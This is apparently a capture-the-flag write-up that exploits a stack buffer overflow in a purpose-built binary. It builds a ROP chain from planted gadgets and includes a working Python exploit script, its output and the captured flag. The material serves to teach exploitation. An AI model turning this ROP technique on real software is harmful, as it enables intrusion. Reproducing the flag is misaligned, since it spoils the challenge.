## 1. Initial Reconnaissance

We are given four files:
- `service` — the vulnerable ELF binary
- `service.c` — source code
- `client.py` — a helper to send payloads to the remote service
- `transport.txt` — notes about the environment

First, inspect the binary:

```bash
file service
checksec --file=service
```

**Result:**
```
service: ELF 64-bit LSB executable, x86-64, statically linked, not stripped
NX on, no PIE, no stack canary
```

The binary is **statically linked**, **non-PIE**, **NX enabled**, and **no stack canary**. This means:
- All function addresses are fixed at compile time.
- We cannot execute shellcode on the stack, but we can use ROP.
- No canary to leak/avoid, so a simple buffer overflow works.

---

## 2. Source Code Analysis

The provided `service.c` is short and revealing:

```c
void reward(void) {
    char b[160] = {0};
    const char *p = getenv("FLAG_PATH");
    FILE *f = fopen(p ? p : "/run/secrets/flag", "r");
    if (f) { fgets(b, sizeof(b), f); fclose(f); puts(b); }
}

void setup(void) {
    alarm(2); setbuf(stdout, NULL); setbuf(stdin, NULL);
}

__attribute__((naked,used)) void first_seal(void) { __asm__("pop %rdi; ret"); }
__attribute__((naked,used)) void second_seal(void) { __asm__("pop %rsi; ret"); }
__attribute__((naked,used)) void align_stack(void) { __asm__("ret"); }

__attribute__((used)) void vault(uint64_t first, uint64_t second) {
    if (first == 0x746962656231ULL && second == 0x746962656232ULL) reward();
    else puts("The seals do not match.");
    _exit(0);
}

__attribute__((noinline)) void desk(void) {
    char note[64]; puts("Present your petition:"); read(0, note, 256);
}

int main(void) { setup(); desk(); }
```

### Key Observations

- **`desk()`** reads up to **256 bytes** into a **64-byte** buffer `note`. This is a classic stack buffer overflow.
- **`vault(first, second)`** checks two 64-bit arguments:
  - `first == 0x746962656231`
  - `second == 0x746962656232`
  If both match, it calls `reward()`, which reads and prints the flag.
- The functions `first_seal`, `second_seal`, and `align_stack` are deliberately crafted gadgets:
  - `first_seal`: `pop rdi; ret`
  - `second_seal`: `pop rsi; ret`
  - `align_stack`: `ret` (for stack alignment)
- The binary is **not stripped**, so we can find these symbols easily.

**Goal:** Overflow the buffer in `desk()` and build a ROP chain that calls `vault(0x746962656231, 0x746962656232)`.

---

## 3. Finding Gadget Addresses

Use `nm` to get the addresses of the relevant symbols:

```bash
nm -n service > symbols.txt
grep -E ' vault$| first_seal$| second_seal$| align_stack$| reward$' symbols.txt
```

Output:
```
00000000004017c5 T reward
0000000000401935 T first_seal
000000000040193a T second_seal
000000000040193f T align_stack
0000000000401943 T vault
```

So:
- `pop rdi; ret` → `0x401935`
- `pop rsi; ret` → `0x40193a`
- `ret` (alignment) → `0x40193f`
- `vault` → `0x401943`

---

## 4. Calculating the Offset

In `desk()`:
```c
char note[64];
```
The notes use the following compiled frame layout for the supplied build. Other compiler settings can produce a different layout, so the 72-byte offset must be checked against the actual binary:

```
[ note (64 bytes) ]  ← rsp
[ saved RBP (8 bytes) ]
[ return address (8 bytes) ]
```

To overwrite the return address, we need to fill:
- 64 bytes for `note`
- 8 bytes for the saved RBP

**Offset = 64 + 8 = 72 bytes**

---

## 5. Building the ROP Chain

We want to call:
```c
vault(0x746962656231, 0x746962656232);
```

The System V AMD64 calling convention passes:
- 1st argument in `RDI`
- 2nd argument in `RSI`

So our ROP chain is:

1. `pop rdi; ret` → load `0x746962656231` into RDI
2. `pop rsi; ret` → load `0x746962656232` into RSI
3. `ret` (alignment gadget) → align stack to 16 bytes
4. `vault` → call the function

**Why the alignment gadget?**  
The System V AMD64 ABI expects RSP + 8 to be a multiple of 16 at ordinary function entry. A ROP chain must account for every popped word when entering a function. The extra `ret` advances RSP by 8 bytes to adjust alignment for the recorded chain; whether a specific library call uses alignment-sensitive instructions depends on the build.

**Payload structure:**

```
[ 72 bytes of 'A' ]
[ pop_rdi ]          (0x401935)
[ 0x746962656231 ]
[ pop_rsi ]          (0x40193a)
[ 0x746962656232 ]
[ align_stack ]      (0x40193f)
[ vault ]            (0x401943)
```

There are six 8-byte words after the padding: two gadget addresses, two constants, the alignment gadget, and the vault address. Total payload size: **72 + 8 × 6 = 120 bytes**.

---

## 6. Local Testing

Create a fake flag and an exploit script.

```bash
echo 'TIBEB{local_test_flag}' > testflag
```

`exploit.py`:
```python
import struct, subprocess, os

syms = {}
with open('symbols.txt') as f:
    for line in f:
        parts = line.split()
        if len(parts) >= 3:
            syms[parts[2]] = int(parts[0], 16)

pop_rdi = syms['first_seal']
pop_rsi = syms['second_seal']
align_stack = syms['align_stack']
vault = syms['vault']

val1 = 0x746962656231
val2 = 0x746962656232

offset = 72
payload = b'A' * offset
payload += struct.pack('<Q', pop_rdi)
payload += struct.pack('<Q', val1)
payload += struct.pack('<Q', pop_rsi)
payload += struct.pack('<Q', val2)
payload += struct.pack('<Q', align_stack)
payload += struct.pack('<Q', vault)

with open('payload.bin', 'wb') as f:
    f.write(payload)

env = os.environ.copy()
env['FLAG_PATH'] = os.path.abspath('testflag')
p = subprocess.run(['./service'], input=payload, capture_output=True, env=env, timeout=5)
print("STDOUT:", p.stdout.decode(errors='replace'))
```

Run it:
```bash
chmod +x service
python3 exploit.py
```

Output:
```
STDOUT: Present your petition:
TIBEB{local_test_flag}
```

The exploit works locally.

---

## 7. Remote Exploitation

Use the provided `client.py` to send the payload to the remote service:

```bash
python3 client.py https://challenges.tibeb.org/75013086-3565-42a1-8484-e8b47f9b5957 < payload.bin
```

Output:
```
Present your petition:
tibeb{two_seals_90f0d4e024cac917d9d4}
```

**Flag captured!**

---

## 8. Interesting & Tricky Points

- **Naked functions as gadgets:** The challenge authors intentionally defined `first_seal`, `second_seal`, and `align_stack` as `naked` functions containing only the desired assembly. This avoids needing to search for gadgets in a large binary.
- **Stack alignment:** The chain includes an extra `ret` to satisfy the expected function-entry alignment. Misalignment can fail in some library paths; it is not correct to assume every implementation of `puts` uses `movaps`.
- **Static binary, no PIE:** All addresses are fixed, so no ASLR bypass needed. The binary contains everything required.
- **No stack canary:** Simplifies the overflow—no need to leak or brute-force canaries.
- **Offset calculation:** The recorded layout uses 64 bytes before the saved RBP and 8 more before the return address. Confirm this 72-byte offset in the compiled binary rather than deriving it from the C declaration alone.
- **The constants:** `0x746962656231` and `0x746962656232` are 64-bit integers. In little-endian memory they appear as `1bebit` and `2bebit`, but the comparison is numeric. We just load the immediate values into registers.
- **`vault` exits:** After calling `reward`, `vault` calls `_exit(0)`, so we don't need to return cleanly. This makes the ROP chain simpler.

---

## 9. Conclusion

The challenge demonstrates a straightforward x86-64 ROP exploit against a statically linked, non-PIE binary with no stack canary. The key steps are:
1. Identify the buffer overflow in `desk()`.
2. Find the offset to the return address (72 bytes).
3. Use the provided `pop rdi`, `pop rsi`, and `ret` gadgets to set up arguments.
4. Call `vault` with the correct magic values.
5. Test locally, then send to the remote service.

**Flag:** `tibeb{two_seals_90f0d4e024cac917d9d4}`
